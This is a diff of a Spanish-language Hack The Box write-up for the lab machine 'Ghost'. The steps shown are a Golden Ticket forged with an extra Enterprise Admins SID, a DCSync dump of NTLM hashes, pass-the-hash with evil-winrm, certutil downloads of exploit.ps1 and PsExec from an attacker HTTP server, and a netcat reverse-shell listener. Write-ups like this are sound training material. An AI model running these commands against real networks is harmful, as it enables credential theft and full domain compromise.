 time="2025-02-07T14:07:26-08:00" level=info msg="Connection established" addr="10.10.16.7:11601"
 ```
 
+Verificaremos en el servidor Proxy de `ligolo-ng` que se ha detectado una sesión nueva, una vez conectada, ingresaremos el comando `start` para iniciar la compartición de la red.
 
-
-```
-// Some code❯ /opt/ligolo/proxy -selfcert
+```bash
+/opt/ligolo/proxy -selfcert
 WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
 WARN[0000] Using self-signed certificates               
 WARN[0000] TLS Certificate fingerprint for ligolo is: DB1E783AF04CFDBBC26A8A87A1EDAD3E1AB2DC1B9FD699144B66E86A66DAB6BB 
@@ -1928,18 +1912,30 @@ ligolo-ng » session
 [Agent : NT AUTHORITY\SYSTEM@PRIMARY] » INFO[0074] Starting tunnel to NT AUTHORITY\SYSTEM@PRIMARY (31530714-8a8b-4acd-8cfd-765668586137) 
 ```
 
+Añadiremos la siguiente entrada en nuestro archivo `/etc/hosts`.
 
-
-```
+```bash
 ❯ cat /etc/hosts | grep corp.ghost.htb
 10.0.0.10 corp.ghost.htb
 ```
 
-
-
 ### Generating Custom Golden Ticket for Administrator in corp.ghost.htb
 
+En este punto, para realizar el `Golden Ticket Attack` deberemos de disponer de los siguientes puntos claves.
 
+* Clave aes256\_hmac del usuario krbtgt --> esta clave nos servirá para generar el Golden Ticket.
+* Domain SID --> deberemos de disponer del Domain SID del dominio `CORP.GHOST.HTB`.
+* Extra SID --> deberemos de disponer del sid de un grupo de alto privilegio del dominio `GHOST.HTB`.
+
+En este caso, estamos añadiendo el **SID del grupo "Enterprise Admins"** del dominio `GHOST.HTB`, lo que significa que cuando generemos el Golden Ticket en el dominio **corp.ghost.htb**, también dispondremos de permisos en `GHOST.HTB` como si fuéramos miembro de "Enterprise Admins".
+
+#### ¿Para qué sirve esto?
+
+* **Enterprise Admins** es un grupo con privilegios **altos en toda la estructura de dominios**, lo que permite **administrar otros dominios dentro del bosque**.
+* Como disponemos una relación de confianza entre **corp.ghost.htb** y `GHOST.HTB`, podemos **movernos lateralmente** y escalar privilegios en `GHOST.HTB`.
+* Básicamente, con este **Golden Ticket**, podemosactuar como un **Administrador de Dominio en** `GHOST.HTB`, aunque originalmente solo teníamos acceso en `CORP.GHOST.HTB`.
+
+Realizaremos el `Golden Ticket` y dispondremos del archivo `Administrator.ccache` que utilizaremos para autenticarnos como `Administrator` en el dominio `GHOST.HTB.`
 
 ```bash
 ❯ impacket-ticketer -aesKey b0eb79f35055af9d61bcbbe8ccae81d98cf63215045f7216ffd1f8e009a75e8d -domain-sid S-1-5-21-2034262909-2733679486-179904498 -extra-sid S-1-5-21-4084500788-938703357-3654145966-519 -domain corp.ghost.htb Administrator 2>/dev/null
@@ -1959,10 +1955,11 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Saving ticket in Administrator.ccache
 ```
 
-
+Importaremos el `Administrator.ccache` en la variable `KRB5CCNAME` y verificaremos que el Ticket Granting Ticket (TGT) del usuario `Administrator` es válido.
 
 ```bash
 ❯ export KRB5CCNAME=Administrator.ccache
+
 ❯ klist -i
 Ticket cache: FILE:Administrator.ccache
 Default principal: Administrator@CORP.GHOST.HTB
@@ -1972,13 +1969,11 @@ Valid starting     Expires            Service principal
 	renew until 06/02/35 04:14:33
 ```
 
-
-
 ### Dumping Domain Credentials and NTDS Secrets from DC01 in corp.ghost.htb
 
+Una vez dispongamos del TGT del usuario `Administrator`, lo que realizaremos es un `DCSync Attack` para disponer de todos los hashes NTLM del dominio `GHOST.HTB`. Entre los hashes obtenidos, el que nos interesa es el del usuario `Administrator` del dominio `GHOST.HTB`.
 
-
-```
+```bash
 ❯ secretsdump.py dc01.ghost.htb -k -no-pass -just-dc-ntlm
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -2003,12 +1998,11 @@ LINUX-DEV-WS01$:3630:aad3b435b51404eeaad3b435b51404ee:be14220f3b71b34a61d2d516d5
 adfs_gmsa$:4101:aad3b435b51404eeaad3b435b51404ee:0bef79ae4d25b1864570212e33922d14:::
 GHOST-CORP$:2101:aad3b435b51404eeaad3b435b51404ee:be0a51897087a382ca0726b2403e6b00:::
 [*] Cleaning up...
-
 ```
 
+Verificaremos que podemos autenticarnos mediante **PassTheHash** con el hash NTLM del usuario `Administrator`. Una vez verificada la autenticación, nos conectaremos al DC mediante `evil-winrm` y verificaremos la flag de **root.txt**.
 
-
-```
+```bash
 ❯ nxc winrm 10.10.11.24 -u 'Administrator' -H '1cdb17d5c14ff69e7067cffcc9e470bd'
 WINRM       10.10.11.24     5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:ghost.htb)
 WINRM       10.10.11.24     5985   DC01             [+] ghost.htb\Administrator:1cdb17d5c14ff69e7067cffcc9e470bd (Pwn3d!)
@@ -2023,10 +2017,8 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
                                         
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
-9aa9bfa25a6aa3ef5e12ae399ac93d51
+9aa9bfa2************************
 ```
-
-
 
 ## Privilege Escalation (Method 2)
 
@@ -2291,9 +2283,10 @@ while ($true) {
 
 
 
-```
+```powershell
 ❯ ls -l exploit.ps1
 .rw-rw-r-- kali kali 1.8 KB Sat Feb  8 03:30:24 2025  exploit.ps1
+
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
@@ -2302,7 +2295,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 
 
-```
+```powershell
 PS C:\ProgramData> certutil.exe -f -urlcache -split http://10.10.16.7/exploit.ps1 exploit.ps1
 certutil.exe -f -urlcache -split http://10.10.16.7/exploit.ps1 exploit.ps1
 ****  Online  ****
@@ -2313,7 +2306,7 @@ CertUtil: -URLCache command completed successfully.
 
 
 
-```bash
+```powershell
 PS C:\ProgramData> .\exploit.ps1
 .\exploit.ps1
 Access granted to \\dc01.ghost.htb\c$
@@ -2360,10 +2353,10 @@ d-----         1/30/2024   9:21 AM                VMware
 
 
 
-```
+```powershell
 PS C:\ProgramData> cat \\DC01.ghost.htb\C$\Users\Administrator\Desktop\root.txt
 cat \\DC01.ghost.htb\C$\Users\Administrator\Desktop\root.txt
-9aa9bfa25a6aa3ef5e12ae399ac93d51
+9aa9bfa25***********************
 ```
 
 
@@ -2372,16 +2365,17 @@ cat \\DC01.ghost.htb\C$\Users\Administrator\Desktop\root.txt
 
 
 
-```
+```bash
 ❯ ls -l PsExec64.exe
 .rw-rw-r-- kali kali 814 KB Tue Apr 11 18:10:26 2023  PsExec64.exe
+
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
 
 
-```
+```powershell
 PS C:\ProgramData> certutil.exe -f -urlcache -split http://10.10.16.7/PsExec64.exe PsExec64.exe
 certutil.exe -f -urlcache -split http://10.10.16.7/PsExec64.exe PsExec64.exe
 ****  Online  ****
@@ -2392,7 +2386,7 @@ CertUtil: -URLCache command completed successfully.
 
 
 
-```
+```bash
 ❯ rlwrap -cAr nc -nlvp 4444
 listening on [any] 4444...
 ```
@@ -2431,6 +2425,5 @@ hostname
 DC01
 PS C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
 type C:\Users\Administrator\Desktop\root.txt
-9aa9bfa25a6aa3ef5e12ae399ac93d51
-PS C:\Windows\system32> 
+9aa9bfa25***********************
 ```
